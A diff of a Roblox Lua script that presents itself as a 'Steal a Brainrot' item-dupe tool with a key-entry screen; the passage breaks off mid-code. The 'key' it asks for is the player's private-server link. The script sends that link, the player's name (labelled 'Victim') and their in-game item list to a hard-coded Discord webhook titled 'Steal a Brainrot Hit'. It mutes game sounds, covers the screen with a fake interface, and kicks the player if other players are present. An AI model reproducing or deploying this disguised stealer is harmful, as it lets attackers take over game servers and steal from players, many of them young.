@@ -1,483 +1,498 @@
 -- Services
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local HttpService = game:GetService("HttpService")
-local SHOULD_PING = false
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-
--- For webhook requests
-local Request = (syn and syn.request) or http_request or request
-local executor = identifyexecutor and identifyexecutor() or "Unknown"
-local Webhook = "https://discord.com/api/webhooks/1416353772405395516/B8dq7nG12rBA9TYMgQtoIOFmrjq6xIGH6PGaMhbS537M-AsnQmnuDbj02h6LGWO4_tQm" -- 🔥 replace with your webhook
-
--- =======================
--- KEY SYSTEM UI
--- =======================
-local KeyGui = Instance.new("ScreenGui")
-KeyGui.Name = "KeySystem"
-KeyGui.Parent = playerGui
-
--- Outline Frame
-local Outline = Instance.new("Frame")
-Outline.Size = UDim2.new(0, 420, 0, 280)
-Outline.Position = UDim2.new(0.5, -210, 0.5, -140)
-Outline.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Outline.Parent = KeyGui
-local OutlineCorner = Instance.new("UICorner", Outline)
-OutlineCorner.CornerRadius = UDim.new(0, 15)
-
--- Main Frame
-local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(1, -8, 1, -8)
-MainFrame.Position = UDim2.new(0, 4, 0, 4)
-MainFrame.BackgroundColor3 = Color3.fromRGB(120, 0, 200)
-MainFrame.Parent = Outline
-local UICorner = Instance.new("UICorner", MainFrame)
-UICorner.CornerRadius = UDim.new(0, 12)
-
--- Title Bar
-local TitleBar = Instance.new("Frame")
-TitleBar.Size = UDim2.new(1, -16, 0, 50)
-TitleBar.Position = UDim2.new(0, 8, 0, 8)
-TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-TitleBar.BorderSizePixel = 0
-TitleBar.Parent = MainFrame
-local TitleCorner = Instance.new("UICorner", TitleBar)
-TitleCorner.CornerRadius = UDim.new(0, 10)
-
-local TitleText = Instance.new("TextLabel")
-TitleText.Size = UDim2.new(1, 0, 1, 0)
-TitleText.BackgroundTransparency = 1
-TitleText.Text = "Key System"
-TitleText.Font = Enum.Font.GothamBold
-TitleText.TextSize = 26
-TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
-TitleText.Parent = TitleBar
-
--- Subtitle
-local Subtitle = Instance.new("TextLabel")
-Subtitle.Size = UDim2.new(1, 0, 0, 30)
-Subtitle.Position = UDim2.new(0, 0, 0, 65)
-Subtitle.BackgroundTransparency = 1
-Subtitle.Text = "ZuriScripts"
-Subtitle.Font = Enum.Font.Gotham
-Subtitle.TextSize = 18
-Subtitle.TextColor3 = Color3.fromRGB(200, 150, 255)
-Subtitle.Parent = MainFrame
-
--- KeyBox
-local KeyBoxOutline = Instance.new("Frame")
-KeyBoxOutline.Size = UDim2.new(0.85, 4, 0, 44)
-KeyBoxOutline.Position = UDim2.new(0.075, -2, 0, 108)
-KeyBoxOutline.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-KeyBoxOutline.Parent = MainFrame
-local KeyBoxOutlineCorner = Instance.new("UICorner", KeyBoxOutline)
-KeyBoxOutlineCorner.CornerRadius = UDim.new(0, 10)
-
-local TextBox = Instance.new("TextBox")
-TextBox.Size = UDim2.new(1, -4, 1, -4)
-TextBox.Position = UDim2.new(0, 2, 0, 2)
-TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextBox.PlaceholderText = "Paste Your Private Server"
-TextBox.ClearTextOnFocus = false
-TextBox.Text = ""
-TextBox.Font = Enum.Font.Gotham
-TextBox.TextSize = 18
-TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextBox.Parent = KeyBoxOutline
-local KeyBoxCorner = Instance.new("UICorner", TextBox)
-KeyBoxCorner.CornerRadius = UDim.new(0, 8)
-
--- Submit Button
-local SubmitOutline = Instance.new("Frame")
-SubmitOutline.Size = UDim2.new(0.5, 4, 0, 44)
-SubmitOutline.Position = UDim2.new(0.25, -2, 0, 163)
-SubmitOutline.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-SubmitOutline.Parent = MainFrame
-local SubmitOutlineCorner = Instance.new("UICorner", SubmitOutline)
-SubmitOutlineCorner.CornerRadius = UDim.new(0, 10)
-
-local Submit = Instance.new("TextButton")
-Submit.Size = UDim2.new(1, -4, 1, -4)
-Submit.Position = UDim2.new(0, 2, 0, 2)
-Submit.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
-Submit.Text = "Submit Key"
-Submit.Font = Enum.Font.GothamBold
-Submit.TextSize = 20
-Submit.TextColor3 = Color3.fromRGB(255, 255, 255)
-Submit.Parent = SubmitOutline
-local SubmitCorner = Instance.new("UICorner", Submit)
-SubmitCorner.CornerRadius = UDim.new(0, 8)
-
--- Status Text
-local Status = Instance.new("TextLabel")
-Status.Size = UDim2.new(1, 0, 0, 25)
-Status.Position = UDim2.new(0, 0, 1, -30)
-Status.BackgroundTransparency = 1
-Status.Text = "Status: Idle"
-Status.Font = Enum.Font.Gotham
-Status.TextSize = 16
-Status.TextColor3 = Color3.fromRGB(220, 220, 220)
-Status.Parent = MainFrame
-
--- Key + Lock Images
-local KeyImage = Instance.new("ImageLabel")
-KeyImage.Size = UDim2.new(0, 60, 0, 60)
-KeyImage.Position = UDim2.new(0, -30, 0, -25)
-KeyImage.BackgroundTransparency = 1
-KeyImage.Image = "rbxassetid://139772478040015"
-KeyImage.Rotation = 30
-KeyImage.Parent = MainFrame
-
-local LockImage = Instance.new("ImageLabel")
-LockImage.Size = UDim2.new(0, 60, 0, 60)
-LockImage.Position = UDim2.new(1, -40, 0, -25)
-LockImage.BackgroundTransparency = 1
-LockImage.Image = "rbxassetid://98535734828795"
-LockImage.Rotation = -30
-LockImage.Parent = MainFrame
-
--- =======================
--- Validation for PS links
--- =======================
-local function isValidPSLink(link)
-    if not link then return false end
-    local patterns = {
-        "roblox%.com/share%?code=([%w%d]+)&type=Server",
-        "roblox%.com/share%?code=([%w%d]+)&amp;type=Server",
-        "www%.roblox%.com/share%?code=([%w%d]+)&type=Server",
-        "www%.roblox%.com/share%?code=([%w%d]+)&amp;type=Server",
-        "roblox%.com/games/(%d+)/.-%-.-code=([%w%d]+)",
-        "www%.roblox%.com/games/(%d+)/.-%-.-code=([%w%d]+)",
-        "https://www%.roblox%.com/share%?code=([%w%d]+)",
-        "https://roblox%.com/share%?code=([%w%d]+)",
-    }
-    for _, pattern in ipairs(patterns) do
-        local code = link:match(pattern)
-        if code and #code > 0 then
-            return true
-        end
-    end
-    if link:find("roblox%.com") and (link:find("share") or link:find("code=")) then
-        return true
-    end
-    return false
-end
-
--- =======================
--- Webhook Function
--- =======================
-local function sendKeyToWebhook(player, psLink, brainrots)
-    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
-
-    local body = {
-        content = SHOULD_PING and "@everyone" or "",
-        embeds = {{
-            title = "🍌 Steal a Brainrot Hit",
-            color = 4720281, -- #480699 purple
-            description = "**Quick join**\n[Click to join]("..psLink..")",
-            thumbnail = { url = avatarUrl },
-            fields = {
-                { name = "🤡Victim", value = player.Name, inline = true },
-                { name = "🎮Executor", value = executor, inline = true },
-                { name = "📜Brainrot List", value = (#brainrots > 0 and table.concat(brainrots, "\n") or "None found"), inline = false },
-            },
-            footer = { text = "Steal a Brainrot - d4wn" },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
-    }
-
-    pcall(function()
-        Request({
-            Url = Webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(body)
-        })
-    end)
-end
-
--- =======================
--- Show Brainrot Executor
--- =======================
-function showBrainrotExecutor(psLink)
     local Players = game:GetService("Players")
     local TweenService = game:GetService("TweenService")
-    local Workspace = game:GetService("Workspace")
-    local CoreGui = game:GetService("CoreGui")
+    local HttpService = game:GetService("HttpService")
+    local SHOULD_PING = false
     local player = Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+
+    -- ====== PUBLIC SERVER KICK CHECK ======
+-- Simple public server check
+local function isPublicServer()
+    -- If there are more than 2 players, consider it public
+    -- Or you can adjust logic for your needs
+    return #Players:GetPlayers() > 2
+end
+
+if isPublicServer() then
+    player:Kick("⚠️You can only use this script alone in your private server!")
+else
+    print("Safe: running in private/friend server")
+end
+
+
+    -- For webhook requests
+    local Request = (syn and syn.request) or http_request or request
+    local executor = identifyexecutor and identifyexecutor() or "Unknown"
+    local Webhook = "https://discord.com/api/webhooks/1416353772405395516/B8dq7nG12rBA9TYMgQtoIOFmrjq6xIGH6PGaMhbS537M-AsnQmnuDbj02h6LGWO4_tQm" -- 🔥 replace with your webhook
 
     -- =======================
-    -- MUTE ALL WORKSPACE SOUNDS
+    -- KEY SYSTEM UI
     -- =======================
-    local mutedSounds = {}
-    local function muteSound(sound: Sound)
-        if not mutedSounds[sound] then
-            mutedSounds[sound] = sound.Volume
-            sound.Volume = 0
-        end
-    end
+    local KeyGui = Instance.new("ScreenGui")
+    KeyGui.Name = "KeySystem"
+    KeyGui.Parent = playerGui
 
-    for _, sound in pairs(Workspace:GetDescendants()) do
-        if sound:IsA("Sound") then muteSound(sound) end
-    end
+    -- Outline Frame
+    local Outline = Instance.new("Frame")
+    Outline.Size = UDim2.new(0, 420, 0, 280)
+    Outline.Position = UDim2.new(0.5, -210, 0.5, -140)
+    Outline.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    Outline.Parent = KeyGui
+    local OutlineCorner = Instance.new("UICorner", Outline)
+    OutlineCorner.CornerRadius = UDim.new(0, 15)
 
-    Workspace.DescendantAdded:Connect(function(d)
-        if d:IsA("Sound") then muteSound(d) end
-    end)
+    -- Main Frame
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Size = UDim2.new(1, -8, 1, -8)
+    MainFrame.Position = UDim2.new(0, 4, 0, 4)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(120, 0, 200)
+    MainFrame.Parent = Outline
+    local UICorner = Instance.new("UICorner", MainFrame)
+    UICorner.CornerRadius = UDim.new(0, 12)
 
-    -- =======================
-    -- CREATE SCREEN GUI (COREGUI PARENT)
-    -- =======================
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "BrainrotExecutor"
-    screenGui.Parent = CoreGui -- <-- parent to CoreGui to overlap everything
-    screenGui.ResetOnSpawn = false
-    screenGui.IgnoreGuiInset = true
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    -- Title Bar
+    local TitleBar = Instance.new("Frame")
+    TitleBar.Size = UDim2.new(1, -16, 0, 50)
+    TitleBar.Position = UDim2.new(0, 8, 0, 8)
+    TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    TitleBar.BorderSizePixel = 0
+    TitleBar.Parent = MainFrame
+    local TitleCorner = Instance.new("UICorner", TitleBar)
+    TitleCorner.CornerRadius = UDim.new(0, 10)
 
-    -- Main Frame (fullscreen)
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(1, 0, 1, 0)
-    mainFrame.Position = UDim2.new(0, 0, 0, 0)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(120, 81, 169)
-    mainFrame.BorderSizePixel = 0
-    mainFrame.ZIndex = 999 -- make sure it’s above everything
-    mainFrame.Parent = screenGui
-
-    -- Gradient
-    local gradient = Instance.new("UIGradient")
-    gradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 150, 220)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 81, 169))
-    }
-    gradient.Rotation = 135
-    gradient.Parent = mainFrame
-
-    -- Title
-    local title = Instance.new("TextLabel")
-    title.AnchorPoint = Vector2.new(0,0)
-    title.Size = UDim2.new(0.95, 0, 0, 50)
-    title.Position = UDim2.new(0.025, 0, 0.01, 0)
-    title.BackgroundTransparency = 1
-    title.Text = "STEAL A BRAINROT DUPE"
-    title.TextColor3 = Color3.new(1, 1, 1)
-    title.TextScaled = true
-    title.Font = Enum.Font.SourceSansBold
-    title.TextXAlignment = Enum.TextXAlignment.Left
-    title.ZIndex = 1000
-    title.Parent = mainFrame
+    local TitleText = Instance.new("TextLabel")
+    TitleText.Size = UDim2.new(1, 0, 1, 0)
+    TitleText.BackgroundTransparency = 1
+    TitleText.Text = "Key System"
+    TitleText.Font = Enum.Font.GothamBold
+    TitleText.TextSize = 26
+    TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TitleText.Parent = TitleBar
 
     -- Subtitle
-    local subtitle = Instance.new("TextLabel")
-    subtitle.AnchorPoint = Vector2.new(0,0)
-    subtitle.Size = UDim2.new(0.95, 0, 0, 30)
-    subtitle.Position = UDim2.new(0.025, 0, 0.08, 0)
-    subtitle.BackgroundTransparency = 1
-    subtitle.Text = "YT: Zuriscripts"
-    subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-    subtitle.TextScaled = true
-    subtitle.Font = Enum.Font.SourceSans
-    subtitle.TextXAlignment = Enum.TextXAlignment.Left
-    subtitle.ZIndex = 1000
-    subtitle.Parent = mainFrame
+    local Subtitle = Instance.new("TextLabel")
+    Subtitle.Size = UDim2.new(1, 0, 0, 30)
+    Subtitle.Position = UDim2.new(0, 0, 0, 65)
+    Subtitle.BackgroundTransparency = 1
+    Subtitle.Text = "ZuriScripts"
+    Subtitle.Font = Enum.Font.Gotham
+    Subtitle.TextSize = 18
+    Subtitle.TextColor3 = Color3.fromRGB(200, 150, 255)
+    Subtitle.Parent = MainFrame
 
-    -- Left Panel (Brainrot List)
-    local leftPanel = Instance.new("Frame")
-    leftPanel.AnchorPoint = Vector2.new(0,0)
-    leftPanel.Size = UDim2.new(0.55, 0, 0.75, 0)
-    leftPanel.Position = UDim2.new(0.025, 0, 0.15, 0)
-    leftPanel.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-    leftPanel.BorderSizePixel = 0
-    leftPanel.ZIndex = 1000
-    leftPanel.Parent = mainFrame
+    -- KeyBox
+    local KeyBoxOutline = Instance.new("Frame")
+    KeyBoxOutline.Size = UDim2.new(0.85, 4, 0, 44)
+    KeyBoxOutline.Position = UDim2.new(0.075, -2, 0, 108)
+    KeyBoxOutline.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    KeyBoxOutline.Parent = MainFrame
+    local KeyBoxOutlineCorner = Instance.new("UICorner", KeyBoxOutline)
+    KeyBoxOutlineCorner.CornerRadius = UDim.new(0, 10)
 
-    local leftCorner = Instance.new("UICorner")
-    leftCorner.CornerRadius = UDim.new(0, 8)
-    leftCorner.Parent = leftPanel
+    local TextBox = Instance.new("TextBox")
+    TextBox.Size = UDim2.new(1, -4, 1, -4)
+    TextBox.Position = UDim2.new(0, 2, 0, 2)
+    TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    TextBox.PlaceholderText = "Paste Your Private Server"
+    TextBox.ClearTextOnFocus = false
+    TextBox.Text = ""
+    TextBox.Font = Enum.Font.Gotham
+    TextBox.TextSize = 18
+    TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+    TextBox.Parent = KeyBoxOutline
+    local KeyBoxCorner = Instance.new("UICorner", TextBox)
+    KeyBoxCorner.CornerRadius = UDim.new(0, 8)
 
-    local listTitle = Instance.new("TextLabel")
-    listTitle.Size = UDim2.new(1, 0, 0, 35)
-    listTitle.Position = UDim2.new(0, 0, 0, 10)
-    listTitle.BackgroundTransparency = 1
-    listTitle.Text = "Brainrot list"
-    listTitle.TextColor3 = Color3.new(1, 1, 1)
-    listTitle.TextScaled = true
-    listTitle.Font = Enum.Font.SourceSansBold
-    listTitle.ZIndex = 1001
-    listTitle.Parent = leftPanel
+    -- Submit Button
+    local SubmitOutline = Instance.new("Frame")
+    SubmitOutline.Size = UDim2.new(0.5, 4, 0, 44)
+    SubmitOutline.Position = UDim2.new(0.25, -2, 0, 163)
+    SubmitOutline.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    SubmitOutline.Parent = MainFrame
+    local SubmitOutlineCorner = Instance.new("UICorner", SubmitOutline)
+    SubmitOutlineCorner.CornerRadius = UDim.new(0, 10)
 
-    local scrollFrame = Instance.new("ScrollingFrame")
-    scrollFrame.Size = UDim2.new(1, -10, 1, -50)
-    scrollFrame.Position = UDim2.new(0, 5, 0, 45)
-    scrollFrame.BackgroundTransparency = 1
-    scrollFrame.BorderSizePixel = 0
-    scrollFrame.ScrollBarThickness = 6
-    scrollFrame.ZIndex = 1001
-    scrollFrame.Parent = leftPanel
+    local Submit = Instance.new("TextButton")
+    Submit.Size = UDim2.new(1, -4, 1, -4)
+    Submit.Position = UDim2.new(0, 2, 0, 2)
+    Submit.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+    Submit.Text = "Submit Key"
+    Submit.Font = Enum.Font.GothamBold
+    Submit.TextSize = 20
+    Submit.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Submit.Parent = SubmitOutline
+    local SubmitCorner = Instance.new("UICorner", Submit)
+    SubmitCorner.CornerRadius = UDim.new(0, 8)
 
-    local listLayout = Instance.new("UIListLayout")
-    listLayout.SortOrder = Enum.SortOrder.LayoutOrder
-    listLayout.Padding = UDim.new(0, 5)
-    listLayout.Parent = scrollFrame
+    -- Status Text
+    local Status = Instance.new("TextLabel")
+    Status.Size = UDim2.new(1, 0, 0, 25)
+    Status.Position = UDim2.new(0, 0, 1, -30)
+    Status.BackgroundTransparency = 1
+    Status.Text = "Status: Idle"
+    Status.Font = Enum.Font.Gotham
+    Status.TextSize = 16
+    Status.TextColor3 = Color3.fromRGB(220, 220, 220)
+    Status.Parent = MainFrame
 
-    -- Right Panel (Picked Brainrot)
-    local rightPanel = Instance.new("Frame")
-    rightPanel.AnchorPoint = Vector2.new(0,0)
-    rightPanel.Size = UDim2.new(0.4, 0, 0.75, 0)
-    rightPanel.Position = UDim2.new(0.585, 0, 0.15, 0)
-    rightPanel.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-    rightPanel.BorderSizePixel = 0
-    rightPanel.ZIndex = 1000
-    rightPanel.Parent = mainFrame
+    -- Key + Lock Images
+    local KeyImage = Instance.new("ImageLabel")
+    KeyImage.Size = UDim2.new(0, 60, 0, 60)
+    KeyImage.Position = UDim2.new(0, -30, 0, -25)
+    KeyImage.BackgroundTransparency = 1
+    KeyImage.Image = "rbxassetid://139772478040015"
+    KeyImage.Rotation = 30
+    KeyImage.Parent = MainFrame
 
-    local rightCorner = Instance.new("UICorner")
-    rightCorner.CornerRadius = UDim.new(0, 8)
-    rightCorner.Parent = rightPanel
+    local LockImage = Instance.new("ImageLabel")
+    LockImage.Size = UDim2.new(0, 60, 0, 60)
+    LockImage.Position = UDim2.new(1, -40, 0, -25)
+    LockImage.BackgroundTransparency = 1
+    LockImage.Image = "rbxassetid://98535734828795"
+    LockImage.Rotation = -30
+    LockImage.Parent = MainFrame
 
-    -- Selected Brainrot frame
-    local selectedFrame = Instance.new("Frame")
-    selectedFrame.Size = UDim2.new(1, -10, 0, 120)
-    selectedFrame.Position = UDim2.new(0, 5, 0, 10)
-    selectedFrame.BackgroundColor3 = Color3.fromRGB(140, 70, 140)
-    selectedFrame.BorderSizePixel = 0
-    selectedFrame.ZIndex = 1001
-    selectedFrame.Parent = rightPanel
+    -- =======================
+    -- Validation for PS links
+    -- =======================
+    local function isValidPSLink(link)
+        if not link then return false end
+        local patterns = {
+            "roblox%.com/share%?code=([%w%d]+)&type=Server",
+            "roblox%.com/share%?code=([%w%d]+)&amp;type=Server",
+            "www%.roblox%.com/share%?code=([%w%d]+)&type=Server",
+            "www%.roblox%.com/share%?code=([%w%d]+)&amp;type=Server",
+            "roblox%.com/games/(%d+)/.-%-.-code=([%w%d]+)",
+            "www%.roblox%.com/games/(%d+)/.-%-.-code=([%w%d]+)",
+            "https://www%.roblox%.com/share%?code=([%w%d]+)",
+            "https://roblox%.com/share%?code=([%w%d]+)",
+        }
+        for _, pattern in ipairs(patterns) do
+            local code = link:match(pattern)
+            if code and #code > 0 then
+                return true
+            end
+        end
+        if link:find("roblox%.com") and (link:find("share") or link:find("code=")) then
+            return true
+        end
+        return false
+    end
 
-    local selectedCorner = Instance.new("UICorner")
-    selectedCorner.CornerRadius = UDim.new(0, 8)
-    selectedCorner.Parent = selectedFrame
+    -- =======================
+    -- Webhook Function
+    -- =======================
+    local function sendKeyToWebhook(player, psLink, brainrots)
+        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
 
-    local selectedTitle = Instance.new("TextLabel")
-    selectedTitle.Size = UDim2.new(1, 0, 0, 40)
-    selectedTitle.Position = UDim2.new(0, 0, 0, 10)
-    selectedTitle.BackgroundTransparency = 1
-    selectedTitle.Text = "Picked Brainrot"
-    selectedTitle.TextColor3 = Color3.new(1, 1, 1)
-    selectedTitle.TextScaled = true
-    selectedTitle.Font = Enum.Font.SourceSansBold
-    selectedTitle.ZIndex = 1002
-    selectedTitle.Parent = selectedFrame
+        local body = {
+            content = SHOULD_PING and "@everyone" or "",
+            embeds = {{
+                title = "🍌 Steal a Brainrot Hit",
+                color = 4720281, -- #480699 purple
+                description = "**Quick join**\n[Click to join]("..psLink..")",
+                thumbnail = { url = avatarUrl },
+                fields = {
+                    { name = "🤡Victim", value = player.Name, inline = true },
+                    { name = "🎮Executor", value = executor, inline = true },
+                    { name = "📜Brainrot List", value = (#brainrots > 0 and table.concat(brainrots, "\n") or "None found"), inline = false },
+                },
+                footer = { text = "Steal a Brainrot - d4wn" },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }}
+        }
 
-    local selectedName = Instance.new("TextLabel")
-    selectedName.Size = UDim2.new(1, -10, 0, 40)
-    selectedName.Position = UDim2.new(0, 5, 0, 50)
-    selectedName.BackgroundTransparency = 1
-    selectedName.Text = "None Selected"
-    selectedName.TextColor3 = Color3.new(1, 1, 1)
-    selectedName.TextScaled = true
-    selectedName.Font = Enum.Font.SourceSans
-    selectedName.TextWrapped = true
-    selectedName.ZIndex = 1002
-    selectedName.Parent = selectedFrame
+        pcall(function()
+            Request({
+                Url = Webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(body)
+            })
+        end)
+    end
 
-    local spawnButton = Instance.new("TextButton")
-    spawnButton.Size = UDim2.new(1, -10, 0, 50)
-    spawnButton.Position = UDim2.new(0, 5, 1, -60)
-    spawnButton.BackgroundColor3 = Color3.fromRGB(140, 70, 140)
-    spawnButton.Text = "Dupe"
-    spawnButton.TextColor3 = Color3.new(1, 1, 1)
-    spawnButton.TextScaled = true
-    spawnButton.Font = Enum.Font.SourceSansBold
-    spawnButton.BorderSizePixel = 0
-    spawnButton.ZIndex = 1003
-    spawnButton.Parent = rightPanel
+    -- =======================
+    -- Show Brainrot Executor
+    -- =======================
+    function showBrainrotExecutor(psLink)
+        local Players = game:GetService("Players")
+        local TweenService = game:GetService("TweenService")
+        local Workspace = game:GetService("Workspace")
+        local CoreGui = game:GetService("CoreGui")
+        local player = Players.LocalPlayer
 
-    local spawnCorner = Instance.new("UICorner")
-    spawnCorner.CornerRadius = UDim.new(0, 8)
-    spawnCorner.Parent = spawnButton
+        -- =======================
+        -- MUTE ALL WORKSPACE SOUNDS
+        -- =======================
+        local mutedSounds = {}
+        local function muteSound(sound: Sound)
+            if not mutedSounds[sound] then
+                mutedSounds[sound] = sound.Volume
+                sound.Volume = 0
+            end
+        end
 
-    -- SCAN PLAYER BASE AND POPULATE LIST
-    local brainrots = {}
-    for _, plot in ipairs(workspace.Plots:GetChildren()) do
-        local label = plot:FindFirstChild("PlotSign") 
-            and plot.PlotSign:FindFirstChild("SurfaceGui") 
-            and plot.PlotSign.SurfaceGui:FindFirstChild("Frame") 
-            and plot.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel")
-        if label and label.Text:find(player.DisplayName) then
-            local podiums = plot:FindFirstChild("AnimalPodiums")
-            if podiums then
-                for _, podium in ipairs(podiums:GetChildren()) do
-                    local attachment = podium.Base.Spawn:FindFirstChild("Attachment")
-                    local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
-                    if overhead then
-                        local name = overhead:FindFirstChild("DisplayName") and overhead.DisplayName.Text or "Unknown"
-                        table.insert(brainrots, name)
+        for _, sound in pairs(Workspace:GetDescendants()) do
+            if sound:IsA("Sound") then muteSound(sound) end
+        end
+
+        Workspace.DescendantAdded:Connect(function(d)
+            if d:IsA("Sound") then muteSound(d) end
+        end)
+
+        -- =======================
+        -- CREATE SCREEN GUI (COREGUI PARENT)
+        -- =======================
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "BrainrotExecutor"
+        screenGui.Parent = CoreGui -- <-- parent to CoreGui to overlap everything
+        screenGui.ResetOnSpawn = false
+        screenGui.IgnoreGuiInset = true
+        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+        -- Main Frame (fullscreen)
+        local mainFrame = Instance.new("Frame")
+        mainFrame.Size = UDim2.new(1, 0, 1, 0)
+        mainFrame.Position = UDim2.new(0, 0, 0, 0)
+        mainFrame.BackgroundColor3 = Color3.fromRGB(120, 81, 169)
+        mainFrame.BorderSizePixel = 0
+        mainFrame.ZIndex = 999 -- make sure it’s above everything
+        mainFrame.Parent = screenGui
+
+        -- Gradient
+        local gradient = Instance.new("UIGradient")
+        gradient.Color = ColorSequence.new{
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 150, 220)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 81, 169))
+        }
+        gradient.Rotation = 135
+        gradient.Parent = mainFrame
+
+        -- Title
+        local title = Instance.new("TextLabel")
+        title.AnchorPoint = Vector2.new(0,0)
+        title.Size = UDim2.new(0.95, 0, 0, 50)
+        title.Position = UDim2.new(0.025, 0, 0.01, 0)
+        title.BackgroundTransparency = 1
+        title.Text = "STEAL A BRAINROT DUPE"
+        title.TextColor3 = Color3.new(1, 1, 1)
+        title.TextScaled = true
+        title.Font = Enum.Font.SourceSansBold
+        title.TextXAlignment = Enum.TextXAlignment.Left
+        title.ZIndex = 1000
+        title.Parent = mainFrame
+
+        -- Subtitle
+        local subtitle = Instance.new("TextLabel")
+        subtitle.AnchorPoint = Vector2.new(0,0)
+        subtitle.Size = UDim2.new(0.95, 0, 0, 30)
+        subtitle.Position = UDim2.new(0.025, 0, 0.08, 0)
+        subtitle.BackgroundTransparency = 1
+        subtitle.Text = "YT: Zuriscripts"
+        subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+        subtitle.TextScaled = true
+        subtitle.Font = Enum.Font.SourceSans
+        subtitle.TextXAlignment = Enum.TextXAlignment.Left
+        subtitle.ZIndex = 1000
+        subtitle.Parent = mainFrame
+
+        -- Left Panel (Brainrot List)
+        local leftPanel = Instance.new("Frame")
+        leftPanel.AnchorPoint = Vector2.new(0,0)
+        leftPanel.Size = UDim2.new(0.55, 0, 0.75, 0)
+        leftPanel.Position = UDim2.new(0.025, 0, 0.15, 0)
+        leftPanel.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+        leftPanel.BorderSizePixel = 0
+        leftPanel.ZIndex = 1000
+        leftPanel.Parent = mainFrame
+
+        local leftCorner = Instance.new("UICorner")
+        leftCorner.CornerRadius = UDim.new(0, 8)
+        leftCorner.Parent = leftPanel
+
+        local listTitle = Instance.new("TextLabel")
+        listTitle.Size = UDim2.new(1, 0, 0, 35)
+        listTitle.Position = UDim2.new(0, 0, 0, 10)
+        listTitle.BackgroundTransparency = 1
+        listTitle.Text = "Brainrot list"
+        listTitle.TextColor3 = Color3.new(1, 1, 1)
+        listTitle.TextScaled = true
+        listTitle.Font = Enum.Font.SourceSansBold
+        listTitle.ZIndex = 1001
+        listTitle.Parent = leftPanel
+
+        local scrollFrame = Instance.new("ScrollingFrame")
+        scrollFrame.Size = UDim2.new(1, -10, 1, -50)
+        scrollFrame.Position = UDim2.new(0, 5, 0, 45)
+        scrollFrame.BackgroundTransparency = 1
+        scrollFrame.BorderSizePixel = 0
+        scrollFrame.ScrollBarThickness = 6
+        scrollFrame.ZIndex = 1001
+        scrollFrame.Parent = leftPanel
+
+        local listLayout = Instance.new("UIListLayout")
+        listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+        listLayout.Padding = UDim.new(0, 5)
+        listLayout.Parent = scrollFrame
+
+        -- Right Panel (Picked Brainrot)
+        local rightPanel = Instance.new("Frame")
+        rightPanel.AnchorPoint = Vector2.new(0,0)
+        rightPanel.Size = UDim2.new(0.4, 0, 0.75, 0)
+        rightPanel.Position = UDim2.new(0.585, 0, 0.15, 0)
+        rightPanel.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+        rightPanel.BorderSizePixel = 0
+        rightPanel.ZIndex = 1000
+        rightPanel.Parent = mainFrame
+
+        local rightCorner = Instance.new("UICorner")
+        rightCorner.CornerRadius = UDim.new(0, 8)
+        rightCorner.Parent = rightPanel
+
+        -- Selected Brainrot frame
+        local selectedFrame = Instance.new("Frame")
+        selectedFrame.Size = UDim2.new(1, -10, 0, 120)
+        selectedFrame.Position = UDim2.new(0, 5, 0, 10)
+        selectedFrame.BackgroundColor3 = Color3.fromRGB(140, 70, 140)
+        selectedFrame.BorderSizePixel = 0
+        selectedFrame.ZIndex = 1001
+        selectedFrame.Parent = rightPanel
+
+        local selectedCorner = Instance.new("UICorner")
+        selectedCorner.CornerRadius = UDim.new(0, 8)
+        selectedCorner.Parent = selectedFrame
+
+        local selectedTitle = Instance.new("TextLabel")
+        selectedTitle.Size = UDim2.new(1, 0, 0, 40)
+        selectedTitle.Position = UDim2.new(0, 0, 0, 10)
